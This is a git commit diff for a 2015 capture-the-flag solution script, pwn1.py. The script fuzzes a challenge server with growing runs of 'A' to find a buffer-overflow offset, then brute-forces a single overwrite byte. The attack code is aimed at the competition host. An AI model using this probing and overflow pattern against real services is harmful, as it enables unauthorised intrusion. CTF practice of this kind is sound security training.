5395eebd156506ba4880f9ce8f6f327124e7676f
Kenneth Li <kennethli.3470@gmail.com>
2015-12-06 11:59:46 -0500

    fibnot, pwn

--- sCTF_q2_2015/pwn1.py
+++ sCTF_q2_2015/pwn1.py
@@ -5,9 +5,26 @@ import socket
 host = 'pwn.problem.sctf.io'
 port = 1337
 
-for i in range(42):
-  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  s.connect((host, port))
-  s.sendall('A' * i + '\n')
-  print s.recv(1024)
-  s.close()
+def findVuln():
+  for i in range(42):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    s.sendall('A' * i + '\n')
+    data = s.recv(1024)
+    print data
+    if (data == ''):
+      break
+    s.close()
+  return i
+
+def exploit(n):
+  for i in range(0, 128):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    s.sendall('A' * n + chr(i))
+    data = s.recv(1024)
+    print data
+    s.close()
+
+x = findVuln()
+exploit(x)
